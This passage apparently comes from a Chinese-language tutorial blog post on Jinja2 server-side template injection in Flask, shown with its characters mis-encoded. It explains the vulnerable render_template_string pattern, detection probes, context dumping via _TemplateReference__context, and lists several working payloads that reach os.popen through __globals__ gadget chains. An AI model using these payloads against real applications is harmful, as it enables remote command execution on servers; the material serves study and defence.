åœ¨æ¸²æŸ“æ—¶æ³¨å…¥ `**context` ä¸­çš„å˜é‡ä½œä¸ºæ¨¡æ¿ä¸Šä¸‹æ–‡ã€‚</span></span><br><span class="line"><span class="string">        - è‡ªåŠ¨è¿›è¡Œ HTML è½¬ä¹‰ï¼ˆautoescapeï¼‰ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">        template_name_or_list (str | Template | list):</span></span><br><span class="line"><span class="string">            - æ¨¡æ¿æ–‡ä»¶åï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œå¦‚ `&quot;index.html&quot;`ã€‚</span></span><br><span class="line"><span class="string">            - ä¹Ÿå¯ä¼ å…¥ `Template` å¯¹è±¡ï¼ˆå·²åŠ è½½å¥½çš„æ¨¡æ¿ï¼‰ã€‚</span></span><br><span class="line"><span class="string">            - æˆ–ä¼ å…¥æ¨¡æ¿æ–‡ä»¶ååˆ—è¡¨ï¼ŒFlask ä¼šæŒ‰é¡ºåºé€‰æ‹©ç¬¬ä¸€ä¸ªå¯ç”¨çš„æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="string">              ä¾‹å¦‚ï¼š`[&quot;mobile/index.html&quot;, &quot;index.html&quot;]`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        **context (Any):</span></span><br><span class="line"><span class="string">            - æ¨¡æ¿å˜é‡ä¸Šä¸‹æ–‡ï¼Œé”®å€¼å¯¹å½¢å¼ä¼ å…¥ã€‚</span></span><br><span class="line"><span class="string">            - ä¾‹å¦‚ï¼š`user=&quot;Alice&quot;, items=[1, 2, 3]`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="string">        str:</span></span><br><span class="line"><span class="string">            - æ¸²æŸ“åçš„å­—ç¬¦ä¸²ï¼ˆHTML ç­‰ï¼‰ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ç¤ºä¾‹ï¼š</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; render_template(&quot;index.html&quot;, title=&quot;Hello&quot;, name=&quot;Alice&quot;)</span></span><br><span class="line"><span class="string">        &#x27;&lt;html&gt;...Hello Alice...&lt;/html&gt;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    æ³¨æ„ï¼š</span></span><br><span class="line"><span class="string">        - æ¨¡æ¿è·¯å¾„æ˜¯ç›¸å¯¹ Flask åº”ç”¨çš„æ¨¡æ¿æœç´¢è·¯å¾„çš„ã€‚</span></span><br><span class="line"><span class="string">        - å¦‚æœæ¨¡æ¿ä¸å­˜åœ¨ï¼Œä¼šæŠ›å‡º `TemplateNotFound` å¼‚å¸¸ã€‚</span></span><br><span class="line"><span class="string">        - æ¯” `render_template_string` æ›´å¸¸ç”¨ï¼Œå› ä¸ºæ¨¡æ¿æ–‡ä»¶æ›´æ˜“äºç®¡ç†å’Œå¤ç”¨ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Jianja2 åŸºç¡€è¯­æ³•æœ‰ï¼š</p>
<ul>
<li><strong>è¡¨è¾¾å¼è¾“å‡º</strong>ï¼š<code>&#123;&#123; expr &#125;&#125;</code>ï¼ˆæŠŠå€¼æ’åˆ° HTML ä¸­ï¼‰</li>
<li><strong>æ§åˆ¶è¯­å¥</strong>ï¼š<code>&#123;% for ... %&#125; ... &#123;% endfor %&#125;</code>ã€<code>&#123;% if ... %&#125; ... &#123;% endif %&#125;</code></li>
<li><strong>è¿‡æ»¤å™¨</strong>ï¼š<code>&#123;&#123; name|upper &#125;&#125;</code>ã€<code>&#123;&#123; items|join(',') &#125;&#125;</code></li>
<li><strong>å±æ€§&#x2F;ä¸‹æ ‡è®¿é—®</strong>ï¼š<code>obj.attr</code> ä¸ <code>obj[&#39;attr&#39;]</code> éƒ½å¯èƒ½ç”Ÿæ•ˆï¼ˆJinja2 æœ‰è‡ªå·±çš„æŸ¥æ‰¾é¡ºåºï¼‰</li>
<li><strong>å‡½æ•°è°ƒç”¨</strong>ï¼š<code>&#123;&#123; func(1,2) &#125;&#125;</code>ï¼ˆè‹¥ <code>func</code> åœ¨æ¨¡æ¿ä¸Šä¸‹æ–‡é‡Œï¼‰</li>
</ul>
<h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>Jinja2 SSTIï¼ˆServer-Side Template Injectionï¼‰çš„æ ¹æºåœ¨äº <strong>å°†ç”¨æˆ·å¯æ§æ•°æ®ç›´æ¥å½“ä½œæ¨¡æ¿å†…å®¹æˆ–æ¨¡æ¿åå»æ¸²æŸ“</strong>ï¼Œä»è€Œè®©æ”»å‡»è€…æ‰§è¡Œä»»æ„ Jinja2 è¡¨è¾¾å¼ã€‚å¸¸è§çš„é”™è¯¯ç”¨æ³•åŒ…æ‹¬ï¼š</p>
<ul>
<li><p>ç›´æ¥æ¸²æŸ“ç”¨æˆ·è¾“å…¥</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(user_input)</span><br><span class="line">render_template_string(<span class="string">&quot;Hello &quot;</span> + user_input)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>æ¨¡æ¿åå¯æ§ä¸”ç›®å½•å¯ç©¿è¶Šï¼ˆé…åˆæ–‡ä»¶ä¸Šä¼ ï¼‰</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template(user_input)   <span class="comment"># è‹¥ tpl_name å¯æ§ä¸”å¯ `../` ç©¿è¶Šåˆ°ä»»æ„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="æ¼æ´æ¢æµ‹"><a href="#æ¼æ´æ¢æµ‹" class="headerlink" title="æ¼æ´æ¢æµ‹"></a>æ¼æ´æ¢æµ‹</h4><ul>
<li><code>&#123;&#123;7 * 7&#125;&#125;</code> â†’ <code>49</code>ï¼šå­˜åœ¨æ¨¡æ¿æ³¨å…¥</li>
<li><code>&#123;&#123;'7' * 7&#125;&#125;</code> â†’ <code>7777777</code>ï¼šæ¨¡æ¿ç±»å‹ä¸º jinjia2</li>
</ul>
<h4 id="æ¢æµ‹å¯ç”¨å¯¹è±¡"><a href="#æ¢æµ‹å¯ç”¨å¯¹è±¡" class="headerlink" title="æ¢æµ‹å¯ç”¨å¯¹è±¡"></a>æ¢æµ‹å¯ç”¨å¯¹è±¡</h4><p>Jinja2 åœ¨æ¸²æŸ“æ—¶ä¼šåˆ›å»ºä¸€ä¸ª <code>TemplateReference</code> å¯¹è±¡èµ‹å€¼ç»™ <code>self</code>ã€‚å®ƒæŒæœ‰æ¨¡æ¿ä¸Šä¸‹æ–‡å­—å…¸ <code>__context</code>ï¼ˆé€šè¿‡ name mangling å­˜å‚¨ä¸º <code>_TemplateReference__context</code>ï¼‰ã€‚</p>
<blockquote>
<p><strong>Python çš„ name manglingï¼ˆåç§°æ”¹å†™ï¼‰æœºåˆ¶</strong>çš„å…·ä½“æ“ä½œä¸ºï¼š</p>
<ul>
<li><code>TemplateReference</code> ç±»é‡ŒåŸæœ¬å†™çš„æ˜¯ <code>self.__context</code>ï¼ˆå‰é¢ä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰ã€‚</li>
<li>åœ¨ Python ä¸­ï¼Œå¦‚æœå±æ€§æ˜¯ <code>__xxx</code>ï¼ˆåŒä¸‹åˆ’çº¿å¼€å¤´ï¼‰ï¼Œå®ƒä¼šåœ¨ç¼–è¯‘æ—¶è‡ªåŠ¨å˜æˆ <code>_ç±»å__xxx</code>ï¼Œé¿å…å­ç±»è¦†ç›–å†²çªã€‚</li>
<li>æ‰€ä»¥ <code>TemplateReference.__context</code> å˜æˆäº† <code>_TemplateReference__context</code>ã€‚</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>self.__context</code> ä½ åœ¨æ¨¡æ¿é‡Œæ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œä½†çŸ¥é“å®ƒçš„ mangled åå­— <code>_TemplateReference__context</code> å°±èƒ½ç›´æ¥å–åˆ°ã€‚</p>
</blockquote>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ®µå†…å®¹æ¥æ¢æµ‹æ¨¡æ¿è¿è¡Œçš„ä¸Šä¸‹æ–‡ä¸­çš„å¯è¾¾å¯¹è±¡ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;dict&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;lipsum&#x27;</span>: &lt;function generate_lorem_ipsum at <span class="number">0x000002D32189B420</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;cycler&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;joiner&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;namespace&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;url_for&#x27;</span>: &lt;function url_for at <span class="number">0x000002D321ACF060</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;get_flashed_messages&#x27;</span>: &lt;function get_flashed_messages at <span class="number">0x000002D321ACF240</span>&gt;,</span><br><span class="line">    <span class="string">&#x27;config&#x27;</span>: &lt;Config &#123;</span><br><span class="line">        <span class="string">&#x27;ENV&#x27;</span>: <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DEBUG&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;TESTING&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;SECRET_KEY&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(days=<span class="number">31</span>),</span><br><span class="line">        <span class="string">&#x27;USE_X_SENDFILE&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="string">&#x27;http&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;JSON_AS_ASCII&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;JSON_SORT_KEYS&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: <span class="number">4093</span></span><br><span class="line">    &#125;&gt;,</span><br><span class="line">    <span class="string">&#x27;request&#x27;</span>: &lt;Request <span class="string">&#x27;http://127.0.0.1:5000/?name=%7B%7Bself._TemplateReference__context%7D%7D&#x27;</span> [GET]&gt;,</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: &lt;NullSession &#123;&#125;&gt;,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: &lt;flask.g of <span class="string">&#x27;app&#x27;</span>&gt;</span><br><span class="line">&#125; of <span class="literal">None</span>&gt;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­è°ƒç”¨ <code>globals()</code> å‡½æ•°è·å–åˆ°çš„å…¨å±€å‘½åç©ºé—´ï¼Œå¹¶ä¸åŒ…å« Flask åœ¨æ¨¡æ¿ä¸­å¯ç›´æ¥è®¿é—®çš„é‚£äº›å¯¹è±¡ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">globals</span>().keys()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict_keys([<span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;chain&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;Markup&#x27;</span>, <span class="string">&#x27;soft_str&#x27;</span>, <span class="string">&#x27;auto_aiter&#x27;</span>, <span class="string">&#x27;auto_await&#x27;</span>, <span class="string">&#x27;TemplateNotFound&#x27;</span>, <span class="string">&#x27;TemplateRuntimeError&#x27;</span>, <span class="string">&#x27;UndefinedError&#x27;</span>, <span class="string">&#x27;EvalContext&#x27;</span>, <span class="string">&#x27;_PassArg&#x27;</span>, <span class="string">&#x27;concat&#x27;</span>, <span class="string">&#x27;internalcode&#x27;</span>, <span class="string">&#x27;missing&#x27;</span>, <span class="string">&#x27;Namespace&#x27;</span>, <span class="string">&#x27;object_type_repr&#x27;</span>, <span class="string">&#x27;pass_eval_context&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;exported&#x27;</span>, <span class="string">&#x27;async_exported&#x27;</span>, <span class="string">&#x27;identity&#x27;</span>, <span class="string">&#x27;markup_join&#x27;</span>, <span class="string">&#x27;str_join&#x27;</span>, <span class="string">&#x27;unicode_join&#x27;</span>, <span class="string">&#x27;new_context&#x27;</span>, <span class="string">&#x27;TemplateReference&#x27;</span>, <span class="string">&#x27;_dict_method_all&#x27;</span>, <span class="string">&#x27;Context&#x27;</span>, <span class="string">&#x27;BlockReference&#x27;</span>, <span class="string">&#x27;LoopContext&#x27;</span>, <span class="string">&#x27;AsyncLoopContext&#x27;</span>, <span class="string">&#x27;Macro&#x27;</span>, <span class="string">&#x27;Undefined&#x27;</span>, <span class="string">&#x27;make_logging_undefined&#x27;</span>, <span class="string">&#x27;ChainableUndefined&#x27;</span>, <span class="string">&#x27;DebugUndefined&#x27;</span>, <span class="string">&#x27;StrictUndefined&#x27;</span>])</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçš„é”®å‡ ä¹å…¨æ˜¯ <strong><code>jinja2.runtime</code> æ¨¡å—</strong>çš„è¿è¡Œæ—¶ç¬¦å·ï¼Œè€Œ<strong>æ²¡æœ‰</strong> <code>url_for</code>ã€<code>request</code>ã€<code>config</code> ç­‰ Flask æ³¨å…¥çš„å˜é‡ã€‚è¿™æ˜¯å› ä¸º Jinja2 æ¨¡æ¿çš„è¿è¡Œæœºåˆ¶æ˜¯ï¼š</p>
<ul>
<li><strong>æ¨¡æ¿ä¸æ˜¯ç›´æ¥äº¤ç»™ Python è§£é‡Šå™¨æ‰§è¡Œçš„æ–‡æœ¬</strong>ï¼Œè€Œæ˜¯å…ˆè¢«ç¼–è¯‘æˆ <strong>Python å‡½æ•°</strong>ï¼ˆä½äºä¸€ä¸ªä¸“é—¨çš„â€œæ¨¡æ¿æ¨¡å—â€é‡Œï¼‰ã€‚</li>
<li>è¯¥å‡½æ•°çš„<strong>å®šä¹‰å…¨å±€ä½œç”¨åŸŸ</strong>æ¥è‡ª <code>jinja2.runtime</code> çš„ç¬¦å·å¯¼å…¥ï¼Œæ‰€ä»¥ <code>globals()</code> è¿”å›çš„å°±æ˜¯è¿™ä¸ªæ¨¡æ¿æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ã€‚</li>
<li>Flask æä¾›çš„ <code>url_for</code>ã€<code>request</code>ã€<code>config</code> ç­‰å˜é‡<strong>å¹¶ä¸åœ¨ Python çš„ globals æˆ– locals ä¸­</strong>ï¼Œè€Œæ˜¯ç”± Flask çš„ <strong>context processor</strong> åœ¨æ¸²æŸ“æ—¶æ”¾å…¥ <strong><code>jinja2.runtime.Context</code> å¯¹è±¡</strong>ï¼ˆå³æ¨¡æ¿çš„â€œä¸Šä¸‹æ–‡å­—å…¸â€ï¼‰ä¸­ã€‚</li>
<li>æ¨¡æ¿é‡Œçš„å˜é‡è§£ææ˜¯<strong>å…ˆæŸ¥ Context</strong>ï¼Œè€Œä¸æ˜¯ç›´æ¥æŸ¥ Python çš„ <code>locals()</code> &#x2F; <code>globals()</code>ã€‚</li>
</ul>
<p>å› æ­¤ï¼š</p>
<ul>
<li><p><code>globals()</code> åœ¨æ¨¡æ¿é‡Œè¿”å›çš„æ˜¯ <strong>jinja2.runtime</strong> çš„å…¨å±€å‘½åç©ºé—´ï¼ˆç¼–è¯‘åçš„æ¨¡æ¿å‡½æ•°æ‰€å¤„çš„å®šä¹‰ç¯å¢ƒï¼‰ï¼Œ<strong>ä¸</strong>åŒ…å« Flask æ³¨å…¥åˆ°æ¨¡æ¿çš„é‚£äº›å˜é‡ã€‚</p>
</li>
<li><p>æ¨¡æ¿é‡Œèƒ½ç›´æ¥ç”¨çš„ <code>url_for</code> &#x2F; <code>request</code> &#x2F; <code>config</code> ç­‰ï¼Œ<strong>å¹¶ä¸åœ¨ Python çš„ <code>locals()</code> å­—å…¸é‡Œ</strong>ï¼›å®ƒä»¬å­˜æ”¾åœ¨ <strong>Jinja çš„ <code>Context</code> å¯¹è±¡ç»´æŠ¤çš„â€œä¸Šä¸‹æ–‡å­—å…¸â€</strong> ä¸­ï¼Œæ¨¡æ¿å˜é‡è§£æèµ°çš„æ˜¯ <em>Context çš„æŸ¥æ‰¾é€»è¾‘</em>ï¼Œè€Œä¸æ˜¯ Python <code>locals()</code>ã€‚</p>
</li>
<li><p>å› ä¸º <code>eval()</code>&#x2F;<code>exec()</code> è¿™äº›å‡½æ•°åªèƒ½è®¿é—® Python çš„ <code>globals</code>&#x2F;<code>locals</code>ï¼Œ<strong>çœ‹ä¸åˆ° Jinja Context</strong>ï¼›è¦æƒ³åœ¨é‡Œé¢ç”¨ <code>url_for</code> ç­‰ï¼Œéœ€è¦æ˜¾å¼ä¼ å…¥ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; __builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;url_for(&#x27;index&#x27;)&quot;</span>, &#123;<span class="string">&#x27;url_for&#x27;</span>: url_for&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<h4 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>Jinja2 æ¨¡æ¿é‡Œæ‰§è¡Œçš„â€œPythonâ€<strong>å¹¶ä¸æ˜¯å®Œæ•´çš„ Python è§£é‡Šå™¨</strong>ï¼Œè€Œæ˜¯ä¸€ä¸ªå—é™çš„ã€æ¨¡æ¿å¼•æ“å®šåˆ¶åŒ–çš„æ‰§è¡Œç¯å¢ƒã€‚</p>
<p>æ¨¡æ¿æ¸²æŸ“æ—¶ï¼ŒJinja2 ä¼šåˆ›å»ºä¸€ä¸ª <strong>ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆContextï¼‰</strong>ï¼Œé‡Œé¢åªæœ‰ä½ æ˜¾å¼ä¼ å…¥çš„å˜é‡ï¼Œä»¥åŠ Jinja2 &#x2F; Flask è‡ªåŠ¨æ³¨å…¥çš„å…¨å±€å‡½æ•°ï¼ˆæ¯”å¦‚ <code>url_for</code>ã€<code>range</code>ã€<code>dict</code>ï¼‰ã€‚</p>
<p>å¹¶ä¸”åœ¨æ¨¡æ¿é‡Œé»˜è®¤<strong>ä¸èƒ½ç›´æ¥å†™ Python è¯­å¥</strong>ï¼ˆæ¯”å¦‚ <code>import os</code>ã€<code>for</code> å¾ªç¯èµ‹å€¼ç­‰ï¼‰ï¼Œè€Œæ˜¯ç”¨ <strong>æ¨¡æ¿è¯­æ³•</strong>ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; expression &#125;&#125;      # è¾“å‡ºè¡¨è¾¾å¼ç»“æœ</span><br><span class="line"># ä¾‹å¦‚ï¼š</span><br><span class="line">&#123;&#123; x = 1 &#125;&#125;  # âŒ ä¸è¡Œï¼Œä¸èƒ½èµ‹å€¼</span><br><span class="line">&#123;&#123; 1 + 2 &#125;&#125;  # âœ… è¡¨è¾¾å¼</span><br><span class="line"></span><br><span class="line">&#123;% statement %&#125;       # æ§åˆ¶ç»“æ„ï¼ˆforã€if ç­‰ï¼‰</span><br><span class="line"># ä¾‹å¦‚ï¼š</span><br><span class="line">&#123;% for i in range(3) %&#125;</span><br><span class="line">  &#123;&#123; i &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯å› ä¸ºæ¨¡æ¿ä¸­çš„è¡¨è¾¾å¼ä¼šè¢« Jinja2 è§£ææˆä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œç„¶åç”¨å®ƒè‡ªå·±çš„æ±‚å€¼å™¨æ‰§è¡Œï¼Œè€Œä¸æ˜¯ç›´æ¥ <code>eval()</code> åŸç”Ÿ Python ä»£ç ã€‚</p>
<p>ä½†ç”±äº Jinja2 æ”¯æŒ <strong>å±æ€§è®¿é—®å’Œå‡½æ•°è°ƒç”¨</strong>ï¼Œæˆ‘ä»¬å¯ä»¥æ²¿ç€å¯¹è±¡é“¾æ‰¾åˆ° Python å†…éƒ¨å¯¹è±¡ï¼ˆå¦‚ <code>().__class__.__mro__</code>ï¼‰ï¼Œåˆ©ç”¨ Python çš„è‡ªçœç‰¹æ€§ç»•è¿‡æ²™ç®±æ‰§è¡Œä»»æ„ä»£ç ã€‚åŒæ—¶ï¼ŒJinja2 é»˜è®¤æä¾›äº†ä¸€äº›å¯ç›´æ¥è®¿é—®çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œè¿™è®©æˆ‘ä»¬èƒ½å¤Ÿç›¸å¯¹å®¹æ˜“åœ°æ„é€ å‡ºå¯åˆ©ç”¨çš„è°ƒç”¨é“¾ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span 